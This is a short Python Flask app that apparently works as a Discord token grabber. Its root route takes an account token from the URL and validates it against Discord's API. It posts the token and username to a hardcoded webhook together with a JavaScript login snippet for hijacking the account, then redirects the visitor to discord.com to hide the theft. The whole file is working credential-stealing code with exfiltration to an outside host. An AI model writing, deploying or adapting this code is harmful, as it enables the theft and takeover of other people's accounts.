import dhooks
import os
import requests
import time

from flask import Flask, redirect, request, render_template
from dhooks import Webhook, Embed

hook = Webhook(os.getenv("https://discord.com/api/webhooks/1275710508603015180/o-eYyR4ISHLF3ozmAtd103Rzo2GsZ_PkuOB6_o4581_s54EPb7K32U8tNxd75_hKMwqQ"))
app = Flask(__name__)


@app.route('/keep_alive')
def keep_alive():
    print('hello')
    return 'hi'


@app.route('/')
def main_page():
    try:
        token = None
        try:
            token = request.args.get('token').replace(
                '""', "").replace('"', "")
        except:
            return 'hi'
        token_str = str(token)
        try:
            req = requests.get(
                "https://discord.com/api/v10/users/@me",
                headers={"authorization": token},
            )
            json = req.json()
            embed = Embed(
                title=f"{json['username']}#{json['discriminator']}", description=token)
            code = '```javascript\nlet token="**token**";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);\n```'
            code = code.replace('**token**', token)
            embed.add_field(name='Javascript Code', value=code, inline=True)
            hook.send(embed=embed)
        except:
            return redirect("https://discord.com")
    except:
        return redirect("https://discord.com")
    return redirect("https://discord.com")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)